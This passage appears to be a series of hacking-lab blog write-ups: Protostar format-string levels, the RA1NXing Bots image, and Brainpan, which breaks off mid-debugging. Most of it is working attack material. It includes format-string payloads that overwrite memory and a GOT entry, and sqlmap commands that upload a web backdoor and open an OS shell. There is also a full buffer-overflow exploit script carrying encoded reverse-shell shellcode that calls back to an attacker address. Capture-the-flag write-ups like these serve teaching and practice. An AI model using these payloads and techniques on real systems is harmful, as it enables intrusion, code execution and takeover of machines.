(gdb) r $(perl -e &lsquo;print &ldquo;\x38\x96\x04\x08BAAAA&rdquo; . &ldquo;%08x."x132 . &rdquo;%n"&rsquo;)
[snip]
Breakpoint 1, vuln (</p>

<pre><code>                string=0xbffff704 "8\226\004\bBAAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%"...) at format1/format1.c:12
</code></pre>

<p>12  format1/format1.c: No such file or directory.</p>

<pre><code>in format1/format1.c
(gdb) x/wx &amp;target
0x8049638 &lt;target&gt;: 0x000004ad
(gdb) c
Continuing.
1.0000000f.bffff6db.00000000.00000000.d2000000.3398faa1.0022db30.da5bc6eb.6944a17d.00363836.00000000.00000000.706f2f00.72702f74.736f746f.2f726174.2f6e6962.6d726f66.00317461.you have modified the target :)
</code></pre>

<p>```</p>

<p>Note we replace the <code>%x</code> at the end with a <code>%n</code>, thus allowing us to write bytes into the specified address.</p>

<h2>Format String Level 02</h2>

<p>The learning curve after level 1 is much lower for the remaining two levels.  This level is identical to 1, except we need to actually write a specific value (0x64).  Let&rsquo;s begin by first finding our target address:</p>

<p><code>
$ objdump -t format2 | grep target
080496e4 g     O .bss   00000004              target
</code></p>

<p>Modifying my script a bit (since input is now via fgets):</p>

<p><code>
$ python /home/user/test.py
[!] Searching for offset..
[!] Format found at offset 4
[!] String: echo $(perl -e 'print "AAAAAAAA" . "%08x."x4' . "%x") | /opt/protostar/bin/format2
</code></p>

<p>Not so far up the stack this time.  Lets plug in our address:</p>

<p><code>
$ echo $(perl -e 'print "\xe4\x96\x04\x08" . "%x."x3 . "%n"') | /opt/protostar/bin/format2
��200.b7fd8420.bffff604.
target is 26 :(
</code></p>

<p>Not quite there.  Recall that we&rsquo;re writing the number of bytes printed; so we just need to jack up our output formatter, and&hellip;</p>

<p><code>
$ echo $(perl -e 'print "\xe4\x96\x04\x08" . "%19x."x3 . "%n"') | /opt/protostar/bin/format2
��                200.           b7fd8420.           bffff604.
you have modified the target :)
</code></p>

<h2>Format String Level 03</h2>

<p>This level requires us to more accurately write specific data to an address; lets again find our target:</p>

<p><code>
$ objdump -t format3 | grep target
080496f4 g     O .bss   00000004              target
</code></p>

<p>And again running our script:</p>

<p><code>
$ python /home/user/test.py
[!] Searching for offset..
[!] Format found at offset 12
[!] String: echo $(perl -e 'print "AAAAAAAA" . "%08x."x12' . "%x") | /opt/protostar/bin/format3
</code></p>

<p>And if we test this out:</p>

<p><code>
$ python -c 'print "\xf4\x96\x04\x08" + "%x."*11 + "%n"' | /opt/protostar/bin/format3
��0.bffff5c0.b7fd7ff4.0.0.bffff7c8.804849d.bffff5c0.200.b7fd8420.bffff604.
target is 0000004c :(
</code></p>

<p>So we&rsquo;ve validated we can modify the target, but we need to modify all 4 bytes.  At this point, I discovered that we could simply continue to add on data to the value, pop out, and write another byte.  This, however, was tedious, and filled up my command line quickly.  It was at this point that I switched to using direct parameter access symbols.  Essentially, this allows us to directly access a variable from the stack, without having to continually pop values from it.  For example, if we wanted to access the 11th parameter, we would simply use <code>%11$x</code>.  If we return briefly to format1, we can see this in action below:</p>

<p><code>
$ ./format1 $(perl -e 'print "AAAAAA"')'_%128$x';printf "\n"
AAAAAA_41414141
</code></p>

<p>This is a much cleaner way of reading values off the stack.  Testing this on level 3:</p>

<p><code>
$ python -c 'print "AAAABBBBCCCCDDDD" + "_%12$x_%13$x_%14$x_%15$x"' | ./format3
AAAABBBBCCCCDDDD_41414141_42424242_43434343_44444444
target is 00000000 :(
</code></p>

<p>And to verify we&rsquo;re there, we can substitute the characters for addresses, and replace the <code>$x</code> with a <code>$n</code> to write into those addresses:</p>

<p><code>
$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%12$n%13$n%14$n%15$n"' | ./format3
��������
target is 10101010 :(
</code></p>

<p>Figuring out the correct padding values requires some simple math:</p>

<p><code>
first byte = 0x44 - 0x10
second     = 0x55 - 0x44
third      = 0x02 - 0x55
</code></p>

<p>Note we&rsquo;ve left off the fourth byte, we&rsquo;ll return to this in a second.  Simple math tells us that the first byte padding value should be 52:</p>

<p><code>
$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52u%12$n%13$x%14$x%15$x"' | ./format3
��������                                                   080496f580496f680496f7
target is 00000044 :(
</code></p>

<p>The second byte is 17, and the third byte is -83, but if we wrap that we get 173 (0x02 &ndash; 0x55 &amp; 0xff).  This results in:</p>

<p><code>
$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08" + "%52u%12$n%17u%13$n%173u%14$n%15$x"' | ./format3
��������                                                   0       3221222896                                                                                                                                                                   308684389280496f7
you have modified the target :)
</code></p>

<p>As noted earlier, we don&rsquo;t actually have to write anything to the final byte, as it is set due to a previous overflow.</p>

<h2>Format String Level 04</h2>

<p>The final level in the format string section, this one requires us to redirect execution to another method, <code>hello</code>.  This probably means we&rsquo;ll need to overwrite a value in the GOT, or the Global Offset Table, which acts as a trampoline for dynamic libraries.  Let&rsquo;s start by finding the hello function that we want to redirect execution flow to:</p>

<p><code>
$ objdump -M intel -t format4 | grep hello
080484b4 g     F .text  0000001e              hello
</code></p>

<p>And running our script:</p>

<p><code>
$ python /home/user/test.py
[!] Searching for offset..
[!] Format found at offset 4
[!] String: echo $(perl -e 'print "AAAAAAAA" . "%08x."x4' . "%x") | /opt/protostar/bin/format4
</code></p>

<p>If we take a look at the <a href="http://webcache.googleusercontent.com/search?q=cache:KFYMJlYdHdMJ:exploit-exercises.com/protostar/format4+&amp;cd=3&amp;hl=en&amp;ct=clnk&amp;gl=us">code</a>, we see a call to exit right after the vulnerable printf.  This is the entry we want to overwrite.  We now need that address:</p>

<p><code>
$ objdump --dynamic-reloc format4 | grep exit
08049718 R_386_JUMP_SLOT   _exit
08049724 R_386_JUMP_SLOT   exit
</code></p>

<p>So we need to overwrite 0x08049724 with 0x080484b4.  Let&rsquo;s give this a shot:</p>

<p>```
user@protostar:/opt/protostar/bin$ python -c &lsquo;print &ldquo;\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08&rdquo; + &ldquo;%4$n%5$n%6$n%7$n&rdquo;&rsquo; > /tmp/input
user@protostar:/opt/protostar/bin$ gdb -q ./format4
Reading symbols from /opt/protostar/bin/format4&hellip;done.
(gdb) r &lt; /tmp/input
Starting program: /opt/protostar/bin/format4 &lt; /tmp/input
$�%�&amp;�'�</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x10101010 in ?? ()
(gdb)
```</p>

<p>We&rsquo;ve verified we&rsquo;re at the right location and can control EIP; notice, however, that the two addresses only differ by 2 bytes.  If we use the <code>$hn</code>, or a short 2 byte write, we can get by with less code:</p>

<p>```
user@protostar:/opt/protostar/bin$ python -c &lsquo;print &ldquo;\x24\x97\x04\x08&rdquo; + &ldquo;%4$hn&rdquo;&rsquo; > /tmp/input
user@protostar:/opt/protostar/bin$ gdb -q ./format4
Reading symbols from /opt/protostar/bin/format4&hellip;done.
(gdb) r &lt; /tmp/input
Starting program: /opt/protostar/bin/format4 &lt; /tmp/input
$�</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x08040004 in ?? ()
```</p>

<p>More simple math, <code>p/d 0x84b4 - 0x0004</code>, gives us 33968.</p>

<p><code>
$ python -c 'print "\x24\x97\x04\x08" + "%33968u%4$hn"' | ./format4
[snip whitespace]
code execution redirected! you win
</code></p>

<p>And that&rsquo;s it!  Next up, heap exploitation.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[solving RA1NXing Bots]]></title>
    <link href="http://hatRiot.github.io/blog/2013/07/10/solving-ra1nxing-bots/"/>
    <updated>2013-07-10T22:31:29-07:00</updated>
    <id>http://hatRiot.github.io/blog/2013/07/10/solving-ra1nxing-bots</id>
    <content type="html"><![CDATA[<p><a href="http://vulnhub.com/entry/ra1nxing-bots_1,52/">RA1NXing Bots</a> is a vulnerable image intended to jump start security researches' interest in botnets and their exploitability.  This vulnerable image was brought to us by Brian Wallace (<a href="https://twitter.com/botnet_hunter">@botnet_hunter</a>), a botnet security researcher at Cylance and good friend (and Ballast Security co-founder).  This was a pretty interesting  vulnerable image, and good exposure into the sometimes seedy and malevolent world of botnets.</p>

<p>As such, the iconic nmap:</p>

<p>```</p>

<h1>Nmap 6.25 scan initiated Mon Jul  8 02:08:29 2013 as: nmap -sS -A -T5 -p- -oN bot.scan 192.168.1.198</h1>

<p>Nmap scan report for 192.168.1.198
Host is up (0.00044s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.5p1 Debian 6+squeeze3 (protocol 2.0)
| ssh-hostkey: 1024 a2:24:9c:39:48:84:7f:da:1f:51:b9:0a:1b:45:df:aa (DSA)
|<em>2048 35:f5:0e:fa:c3:6b:98:8a:25:e1:f8:bf:de:38:82:03 (RSA)
80/tcp   open  http    Apache httpd 2.2.16 ((Debian))
|</em>http-methods: No Allow or Public header in OPTIONS response (status code 302)
| http-title: Site doesn&rsquo;t have a title (text/html).
|<em>Requested resource was /index.php?page=main
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|</em>  100000  2,3,4        111/udp  rpcbind
6667/tcp open  irc     IRCnet ircd
| irc-info: Server: irc.localhost
| Version: 2.11.2p2. irc.localhost 000A
| Lservers/Lusers: 0/3
| Uptime: 0 days, 0:10:37
| Source host: 192.168.1.147
|_Source ident: NONE or BLOCKED
MAC Address: 08:00:27:4B:51:94 (Cadmus Computer Systems)
Aggressive OS guesses: Linux 2.6.31 (98%), Linux 2.6.32 &ndash; 2.6.35 (97%), Linux 2.6.32 &ndash; 3.6 (96%), Netgear DG834G WAP or Western Digital WD TV media player (96%), Linux 2.6.17 &ndash; 2.6.36 (96%), Linux 2.6.23 &ndash; 2.6.38 (95%), Linux 2.6.22 (95%), Linux 2.6.18 &ndash; 2.6.21 (95%), AXIS 210A or 211 Network Camera (Linux 2.6) (95%), Linux 2.6.18 &ndash; 2.6.32 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: irc.localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>

<p>TRACEROUTE
HOP RTT     ADDRESS
1   0.44 ms 192.168.1.198</p>

<p>OS and Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .</p>

<h1>Nmap done at Mon Jul  8 02:08:52 2013 &mdash; 1 IP address (1 host up) scanned in 23.34 seconds</h1>

<p>```</p>

<p>The two services of interest are the HTTP server and IRC.  The web server comprises a few links with some incredibly basic pages, one of which is an obvious front door at first glance:</p>

<p><img class="center <a" src="href="http://4.bp.blogspot.com/-5SaQmKH03_w/Ud4LthG_-AI/AAAAAAAAAgk/QzjHS8CoXNw/s640/login.jpg">http://4.bp.blogspot.com/-5SaQmKH03_w/Ud4LthG_-AI/AAAAAAAAAgk/QzjHS8CoXNw/s640/login.jpg</a>"></p>

<p>Grabbing the request and handing it off to sqlmap, we quickly have a shell:</p>

<p><code>
root@jali:~/lib_mysqludf_sys-master# sqlmap -u http://192.168.1.198/index.php?page=login --data 'user=blah&amp;password=blah' -p user --os-shell
[....]
[20:33:03] [INFO] the file stager has been successfully uploaded on '/var/www' - http://192.168.1.198:80/tmpufqvr.php
[20:33:03] [INFO] the backdoor has been successfully uploaded on '/var/www' - http://192.168.1.198:80/tmpbqsug.php
[20:33:03] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell&gt; whoami
do you want to retrieve the command standard output? [Y/n/a] a
command standard output:    'www-data'
os-shell&gt;
</code></p>

<p>Dumping out the kernel and listening services doesn&rsquo;t give us anything new.  A local mysql database was set up, and the root password was found in <code>/var/www/main.php</code>, but we can&rsquo;t UDF into it due to file restrictions.  Inside the web root is source for the web site, as well as a <code>/var/www/botsources</code>, which includes the source code for the Ra1nX bot.  This source will come in handy as we explore the system more thoroughly.</p>

<p>At the head of the bot we&rsquo;ve got a bunch of parameters defined; including its connection location and port:</p>

<p><code>
$servers        = "127.0.0.1";
$ports            = "6667";
$admins            = "";
$channels        = "#somechannel";
$realnames         = "jhl";
$nicknames         = "jhl1,jhl2,jhl3,jhl4,jhl5,jhl6,jhl7,jhl8,jhl9,jhl10,jhl11,jhl12,jhl13,jhl14,jhl15,jhl16,jhl17,jhl18,jhl19,jhl20,jhl21,jhl22,jhl23,jhl24,jhl25,jhl26,jhl27,jhl28,jhl29,jhl30";
$chanpass     = "trolol";
</code></p>

<p>If we attempt to connect to the IRC server and join the channel, we get <code>Cannot join to channel #somechannel (Bad channel key)</code>, which is the result of an incorrect password.  The source code specifies a password, but it doesn&rsquo;t work.  Could the bot be changed?</p>

<p><img class="center <a" src="href="http://3.bp.blogspot.com/-lR4idXiox9w/Ud4PQAVFmLI/AAAAAAAAAg0/GLEUZx8R9xE/s640/bot_root.jpg">http://3.bp.blogspot.com/-lR4idXiox9w/Ud4PQAVFmLI/AAAAAAAAAg0/GLEUZx8R9xE/s640/bot_root.jpg</a>"></p>

<p>Looks like some PHP script is being run as root; likely our culprit.  The issue now is communicating with the bot and somehow exploiting it to give us a root shell.  Time to hit that source we grabbed.</p>

<p>As given above, we have a list of nicknames, a channel, server, and password.  The password doesn&rsquo;t work, so we need to figure out another way.  The bot connects to the server using the connection() function, and selects a random nickname/server/port:</p>

<p>```
   while(!$SOCKET &amp;&amp; ($try &lt;= $maxtryconn)){</p>

<pre><code>    $server = random($servers);
    $port     = random($ports);
    $SOCKET = fsockopen($server,$port,$err_num,$err_msg,30);
    $GLOBALS['SOCKET']=$SOCKET;
    $try++;
    sleep(1);
}
if(!$SOCKET) die("Cannot connect to remote host");
if ($SOCKET){
    $GLOBALS['ident']     = $ident    = random($nicknames);
    $GLOBALS['nick']     = $nick     = random($nicknames);
    $GLOBALS['realname']= $realname    = random($realnames);
    SEND("USER XRay 127.0.0.1 localhost : -==Ra1NX Projection==-");
    NICK($nick);
    print "Connected to ".$server.":".$port." ".$nick." (XRay@".gethostbyname($_SERVER["HTTP_HOST"]).") Ra1NX Projection\r\n";
    flush();sleep(1);
}
</code></pre>

<p>```</p>

<p>Once connected to a server, it begins listening for commands.  Text is read off the socket and sent to the <code>parser</code> function, which then, obviously, parses and acts upon the input.  The interesting bit to us is the following snippet:</p>

<p>```
  if(substr($line[3],1,strlen($line[3]))==$nick){ $pubcalled = true; }</p>

<pre><code>if($pubcalled){
    if ($typeMsg=="PRIVMSG" &amp;&amp; $user &amp;&amp; $pubcalled &amp;&amp; $pubcmd) {
        if(function_exists($pubcmd)){
            $sender = "PRIVMSG ".$dropMsg." "._;
            $GLOBALS['sender'] = $sender;
            $arg = str_replace("\r","",$arg);
            $arg = str_replace("\n","",$arg);
            $pubcmd($arg);
        }
    }
}
</code></pre>

<p>```</p>

<p>Essentially, once parsed, a valid command to the bot appears <code>bot nick | @command | arguments</code>
It&rsquo;s also of interest that none of this code verifies the authenticity of the request, nor that it&rsquo;s even coming from a channel.  All we need to do, then, is log into the IRC server and iterate through all available nicknames until we find the connected bot.</p>

<p><img class="center <a" src="href="http://2.bp.blogspot.com/-mTV_DW3zLVk/Ud4Uu8woPnI/AAAAAAAAAhE/yb2drFOGxp0/s640/r00t.jpg">http://2.bp.blogspot.com/-mTV_DW3zLVk/Ud4Uu8woPnI/AAAAAAAAAhE/yb2drFOGxp0/s640/r00t.jpg</a>"></p>

<p>Game over.  Fun image, and looking forward to future botnet scenarios.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[solving brainpan]]></title>
    <link href="http://hatRiot.github.io/blog/2013/04/02/solving-brainpan/"/>
    <updated>2013-04-02T23:09:43-07:00</updated>
    <id>http://hatRiot.github.io/blog/2013/04/02/solving-brainpan</id>
    <content type="html"><![CDATA[<p>Brainpan is the brainchild of superkojiman over at vulnhub, and has some pretty interesting (and frustrating)  twists and turns.  This boot2root is more focused on exploitation of 0days in custom written software, with no metasploit modules or google hunting necessary.  With that, the nmap:</p>

<p>```
root@127:~# nmap -sS -A -p- -T5 192.168.1.110</p>

<p>Starting Nmap 6.25 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2013-03-27 22:06 CDT
Nmap scan report for brainpan (192.168.1.110)
Host is up (0.00040s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
|<em>http-title: Site doesn&rsquo;t have a title (text/html).
| ndmp-version:
|</em>  ERROR: Failed to get host information from server
```</p>

<p>Port 10000 just serves up a page about various exploit statistics in web apps, but 9999 serves up a login page:</p>

<p>```
root@127:~# nc 192.168.1.110 9999
<em>|                            </em>|                                      <br/>
<em>|</em>|<em>|    </em>|  <em>|</em>|    <em>|</em>|<em>|      </em>|<em>|</em>|    <em>|</em>|<em>|      </em>|<em>|</em>|  <em>|</em>|<em>|<br/>
</em>|    <em>|  </em>|<em>|      </em>|    <em>|  </em>|  <em>|    </em>|  <em>|    </em>|  <em>|    </em>|  <em>|    </em>|
<em>|    </em>|  <em>|        </em>|    <em>|  </em>|  <em>|    </em>|  <em>|    </em>|  <em>|    </em>|  <em>|    </em>|
<em>|</em>|<em>|    </em>|          <em>|</em>|<em>|  </em>|  <em>|    </em>|  <em>|</em>|<em>|      </em>|<em>|</em>|  <em>|    </em>|</p>

<pre><code>                                        _|                          
                                        _|
</code></pre>

<p>[<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong> WELCOME TO BRAINPAN </strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>_]</p>

<pre><code>                      ENTER THE PASSWORD                              

                      &gt;&gt; whoareyou
                      ACCESS DENIED
</code></pre>

<p>root@127:~#
```</p>

<p>That&rsquo;s it.  I tried a few basic injections and default passwords to no avail.  I fired up DirBuster to see what I could find, and very quickly I stumped onto <code>/bin/</code>, which contained a single file, <code>brainpan.exe</code>.  I loaded this up into a debugger to see what was inside:</p>

<p><img class="center <a" src="href="http://4.bp.blogspot.com/-XGWNxG1FbCY/UVPCvoJc0LI/AAAAAAAAAbc/J-HSrap9_jw/s640/brainpan.jpg">http://4.bp.blogspot.com/-XGWNxG1FbCY/UVPCvoJc0LI/AAAAAAAAAbc/J-HSrap9_jw/s640/brainpan.jpg</a>"></p>

<p>It appeared that our password was <code>shitstorm</code>, following a strcpy of the incoming buffer.  I fired up the .exe in a VM to see what it did:</p>

<p><img class="center <a" src="href="http://4.bp.blogspot.com/-YnR2vlwbgIs/UVPDmWYEZWI/AAAAAAAAAbk/ZOLdSGpMovg/s640/brainpan_loaded.jpg">http://4.bp.blogspot.com/-YnR2vlwbgIs/UVPDmWYEZWI/AAAAAAAAAbk/ZOLdSGpMovg/s640/brainpan_loaded.jpg</a>"></p>

<p>Looks like this is just a copy of the program that is running in the virtual machine, and according to my registers, vulnerable:</p>

<p><img class="center <a" src="href="http://3.bp.blogspot.com/-uR5L_LXkS8o/UVPEtg3qFXI/AAAAAAAAAbs/zgjG9FTKst0/s640/brainpan_asploded.jpg">http://3.bp.blogspot.com/-uR5L_LXkS8o/UVPEtg3qFXI/AAAAAAAAAbs/zgjG9FTKst0/s640/brainpan_asploded.jpg</a>"></p>

<p>So it appears we need to attach to the login form and see if we can get it to explode with shell execution.  I find it interesting that we were given a copy of the file as a exe instead of an ELF, considering what the host is running.</p>

<p>Exploiting this particular binary was not hard, but I ran into an issue that made it more difficult than it should&rsquo;ve been.  This is a very straightforward stack-based buffer overflow, but continually my stack would get corrupted and shift by one or two bytes:</p>

<p><img class="center <a" src="href="http://2.bp.blogspot.com/-c19Y3eKE7cE/UVWx2YwTsrI/AAAAAAAAAb8/Rg-_YzDb8n4/s640/wat.jpg">http://2.bp.blogspot.com/-c19Y3eKE7cE/UVWx2YwTsrI/AAAAAAAAAb8/Rg-_YzDb8n4/s640/wat.jpg</a>"></p>

<p>To mitigate this, instead of my payload looking like this: <code>[524 bytes of junk | JMP ESP | NOPs | shellcode]</code></p>

<p>I had to jump a little further back to take advantage of some extra instructions: <code>[520 bytes of junk | 4 NOP bytes | PUSH EBP; MOV EBP,ESP JMP ESP | NOPs | shellcode]</code></p>

<p>This aligned my stack properly and allowed me to run a reverse shell.  Here&rsquo;s the exploit:</p>

<p>```
import socket</p>

<h1>msfpayload linux/x86/shell_reverse_tcp LHOST=192.168.1.74 LPORT=443 R | msfencode -e x86/shikata_ga_nai -t c</h1>

<h1>[*] x86/shikata_ga_nai succeeded with size 95 (iteration=1)</h1>

<p>shell = &ldquo;\xdb\xc8\xbf\x12\xad\xd5\x16\xd9\x74\x24\xf4\x58\x29\xc9\xb1&rdquo;\</p>

<pre><code>    "\x12\x31\x78\x17\x03\x78\x17\x83\xfa\x51\x37\xe3\xcb\x72\x4f"\
    "\xef\x78\xc6\xe3\x9a\x7c\x41\xe2\xeb\xe6\x9c\x65\x98\xbf\xae"\
    "\x59\x52\xbf\x86\xdc\x95\xd7\xd8\xb7\x67\x6d\xb1\xc5\x67\x70"\
    "\xfa\x43\x86\xc2\x9a\x03\x18\x71\xd0\xa7\x13\x94\xdb\x28\x71"\
    "\x3e\xcb\x07\x05\xd6\x7b\x77\x8b\x4f\x12\x0e\xa8\xdd\xb9\x99"\
    "\xce\x51\x36\x57\x90";
</code></pre>

<p>try:</p>

<pre><code>payload = '\x41' * 520        #junk
payload += '\x90'*4           #ebp
payload += '\xf0\x12\x17\x31' #push ebp; mov ebp,esp; jmp esp
payload += '\x90'*50          #nop sled
payload += shell              #shellcode

s = socket.socket()
s.connect(('192.168.1.110', 9999))
s.recv(1024)
s.send(payload)
</code></pre>

<p>except Exception, e: print e
```</p>

<p>I then had a connected shell waiting for me on 192.168.1.74; a bit of enumeration:</p>

<p><code>
$ whoami  
puck
$ uname -a
Linux brainpan 3.5.0-25-generic #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 i686 i686 i686 GNU/Linux
$ id
uid=1002(puck) gid=1002(puck) groups=1002(puck)
$ ls /home/
anansi
puck
reynard
</code></p>

<p>To ease my curiousity about the ELF/EXE web server running:</p>

<p>```
$ cat /home/puck/checksrv.sh</p>

<h1>!/bin/bash</h1>

<h1>run brainpan.exe if it stops</h1>

<p>lsof -i:9999
if [[ $? -eq 1 ]]; then</p>

<pre><code>pid=`ps aux | grep brainpan.exe | grep -v grep`
if [[ ! -z $pid ]]; then
    kill -9 $pid
    killall wineserver
    killall winedevice.exe
fi
/usr/bin/wine /home/puck/web/bin/brainpan.exe &amp;
</code></pre>

<p>fi</p>

<h1>run SimpleHTTPServer if it stops</h1>

<p>lsof -i:10000
if [[ $? -eq 1 ]]; then</p>

<pre><code>pid=`ps aux | grep SimpleHTTPServer | grep -v grep`
if [[ ! -z $pid ]]; then
    kill -9 $pid
fi
cd /home/puck/web
/usr/bin/python -m SimpleHTTPServer 10000
</code></pre>

<p>fi
```</p>

<p>It&rsquo;s not actually an elf, but an exe that&rsquo;s running under WINE.  Another interesting bit:</p>

<p><code>
$ which gcc
$ which cc
$ which gdb
$ which objdump
</code></p>

<p>So if we happen to find any more binaries to exploit, we need to hack on it blind.  And in this case&hellip;</p>

<p><code>
$ find / -perm +6000 -type f -exec ls -ld {} \; &gt; setuid; echo done
$ cat setuid
-rwsr-xr-x 1 root root 63632 Sep  6  2012 /bin/umount
-rwsr-xr-x 1 root root 31124 Sep  6  2012 /bin/su
-rwsr-xr-x 1 root root 88768 Sep  6  2012 /bin/mount
-rwsr-xr-x 1 root root 30112 Jun 11  2012 /bin/fusermount
-rwsr-xr-x 1 root root 39124 Oct  2 17:26 /bin/ping6
-rwsr-xr-x 1 root root 34780 Oct  2 17:26 /bin/ping
-rwxr-sr-x 1 root tty 18056 Sep  6  2012 /usr/bin/wall
-rwsr-xr-x 2 root root 115140 Feb 27 14:27 /usr/bin/sudo
-rwxr-sr-x 1 root shadow 45292 Sep  6  2012 /usr/bin/chage
-rwxr-sr-x 1 root crontab 34784 Jun 14  2012 /usr/bin/crontab
-rwsr-xr-x 1 root root 60344 Jun 18  2012 /usr/bin/mtr
-rwxr-sr-x 1 root mail 13944 Jun 14  2012 /usr/bin/dotlockfile
-rwsr-xr-x 1 root root 30936 Sep  6  2012 /usr/bin/newgrp
-rwsr-xr-x 1 root root 31756 Sep  6  2012 /usr/bin/chsh
-rwxr-sr-x 1 root mlocate 34452 Aug 14  2012 /usr/bin/mlocate
-rwxr-sr-x 1 root shadow 18128 Sep  6  2012 /usr/bin/expiry
-rwxr-sr-x 1 root tty 9736 Jun 18  2012 /usr/bin/bsd-write
-rwsr-xr-x 2 root root 115140 Feb 27 14:27 /usr/bin/sudoedit
-rwsr-xr-x 1 root root 40300 Sep  6  2012 /usr/bin/chfn
-rwxr-sr-x 3 root mail 9704 Oct  2 17:32 /usr/bin/mail-lock
-rwsr-xr-x 1 root root 14020 Oct  2 17:26 /usr/bin/traceroute6.iputils
-rwsr-sr-x 1 daemon daemon 46576 Jun 11  2012 /usr/bin/at
-rwsr-xr-x 1 root lpadmin 13672 Dec  4 09:21 /usr/bin/lppasswd
-rwxr-sr-x 3 root mail 9704 Oct  2 17:32 /usr/bin/mail-touchlock
-rwsr-xr-x 1 root root 41292 Sep  6  2012 /usr/bin/passwd
-rwsr-xr-x 1 root root 57964 Sep  6  2012 /usr/bin/gpasswd
-rwxr-sr-x 3 root mail 9704 Oct  2 17:32 /usr/bin/mail-unlock
-rwxr-sr-x 1 root ssh 128424 Sep  6  2012 /usr/bin/ssh-agent
-rwsr-sr-x 1 libuuid libuuid 17996 Sep  6  2012 /usr/sbin/uuidd
-rwsr-xr-- 1 root dip 301944 Sep 26  2012 /usr/sbin/pppd
**-rwsr-xr-x 1 anansi anansi 8761 Mar  4 11:06 /usr/local/bin/validate**
-rwsr-xr-- 1 root messagebus 317564 Oct  3 16:00 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 248064 Sep  6  2012 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 5452 Jun 25  2012 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 9740 Oct  3 21:46 /usr/lib/pt_chown
-rwxr-sr-x 1 root shadow 30372 Jul  3  2012 /sbin/unix_chkpwd
</code></p>

<p>The bolded entry in our list appears to be suid one of the other users, so it&rsquo;s likely we&rsquo;ll need to attack this one.  And, as mentioned earlier, we have zero debugging tools.  To make matters even worse:</p>

<p><code>
$ cat /proc/sys/kernel/randomize_va_space
2
</code></p>

<p>This means full address space layout randomization is enabled.  This should be fun without debugging tools.</p>

<p>One solution (and one my good friend @mulitia used) is to put shellcode into an environmental variable, netcat over a binary for finding its address, then spamming VAS with that address.  This is a brute-force method that works, but in a real environment might not be the most stealthy of ways.  Another way is to make use of a JMP [register] (say, one we control) and move execution to shellcode space.  If we objdump the binary and hunt for JMP, there are none which point to registers.  Another option is CALL, which is essentially a macro to push/jmp:</p>

<p><code>
root@bt:~/brainpan# objdump -M intel -d validate | grep "call"
 8048353:    e8 00 00 00 00           call   8048358 &lt;_init+0xc&gt;
 8048369:    e8 1e 00 00 00           call   804838c &lt;__gmon_start__@plt&gt;
 804836e:    e8 1d 01 00 00           call   8048490 &lt;frame_dummy&gt;
 8048373:    e8 98 02 00 00           call   8048610 &lt;__do_global_ctors_aux&gt;
 804841c:    e8 7b ff ff ff           call   804839c &lt;__libc_start_main@plt&gt;
 8048468:    ff 14 85 14 9f 04 08     call   DWORD PTR [eax*4+0x8049f14]
 80484af:    ff d0                    call   eax
 80484f3:    e8 d4 fe ff ff           call   80483cc &lt;printf@plt&gt;
 80484ff:    e8 e8 fe ff ff           call   80483ec &lt;exit@plt&gt;
 8048511:    e8 96 fe ff ff           call   80483ac &lt;strlen@plt&gt;
 8048527:    e8 90 fe ff ff           call   80483bc &lt;strcpy@plt&gt;
 8048558:    e8 6f fe ff ff           call   80483cc &lt;printf@plt&gt;
 804856c:    e8 5b fe ff ff           call   80483cc &lt;printf@plt&gt;
 804857c:    e8 33 ff ff ff           call   80484b4 &lt;validate&gt;
 8048593:    e8 44 fe ff ff           call   80483dc &lt;puts@plt&gt;
 80485b6:    e8 4f 00 00 00           call   804860a &lt;__i686.get_pc_thunk.bx&gt;
 80485c4:    e8 83 fd ff ff           call   804834c &lt;_init&gt;
 80485f4:    ff 94 b3 18 ff ff ff     call   DWORD PTR [ebx+esi*4-0xe8]
 804862b:    ff d0                    call   eax
 8048643:    e8 00 00 00 00           call   8048648 &lt;_fini+0xc&gt;
 804864f:    e8 dc fd ff ff           call   8048430 &lt;__do_global_dtors_aux&gt;
root@bt:~/brainpan#
</code></p>

<p>Two options here!  Let&rsquo;s see if we control EAX&hellip;</p>

<p>```
root@bt:~/brainpan# gdb ./validate
Reading symbols from /root/brainpan/validate&hellip;done.
(gdb) r $(perl -e &lsquo;print &ldquo;\x41"x120&rsquo;)
Starting program: /root/brainpan/validate $(perl -e &lsquo;print &rdquo;\x41"x120&rsquo;)
warning: the debug information found in &ldquo;/lib/ld-2.11.1.so&rdquo; does not match &ldquo;/lib/ld-linux.so.2&rdquo; (CRC mismatch).</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) x/x $eax
0xffffd3e8:    0x41414141
(gdb)
```</p>

